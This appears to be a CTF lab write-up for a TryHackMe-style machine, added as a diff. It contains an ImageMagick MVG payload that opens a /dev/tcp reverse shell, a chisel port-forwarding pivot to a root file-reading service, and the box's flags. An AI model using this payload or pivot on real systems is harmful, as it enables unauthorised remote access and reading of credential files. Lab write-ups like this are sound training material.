@@ -1,0 +1,66 @@
+IP : 10.10.253.28
+
+Host file entry : magician
+
+Open Ports : 21,8080,8081
+
+Enumuration:
+
+21 : nothing much here
+
+8080 : nothing here as well
+
+8081 : web application for image file conversion using image tricks.
+
+Search for payloads:
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik#exploit-v1
+
+Got a paylod:
+
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
+pop graphic-context
+pop graphic-context
+
+Save it as a png file.
+
+Setup listener and upload the file:
+	We got the shell.
+
+Naviage to /home/magician folder and get the flag:
+	THM{simsalabim_hex_hex}
+
+Privesc:
+Upload and run linpeas.
+
+We found a local loopback listener:
+
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      -               
+
+Lets do port forwarding with chissel:
+
+on target machine :
+	./chisel client 10.9.241.177:9000 R:10.9.241.177:7777:127.0.0.1:6666
+
+on kali machine : 
+	./chisel server -p 9000 --reverse -v
+
+
+Now go to your_ip:7777 ie. 10.9.241.77:7777
+
+We are greeted with one page that reads file, we can read all the files encluding /etc/passwd, /etc/shadow, /etc/hosts ie. we can read root files.
+
+Read the root flag similarly : /root/root.txt
+
+	We get a hexadecimal encoded string : 54484d7b6d616769635f6d61795f6d616b655f6d616e795f6d656e5f6d61647d0a
+
+	Decode for the flag : THM{magic_may_make_many_men_mad}
+
+!!!
+
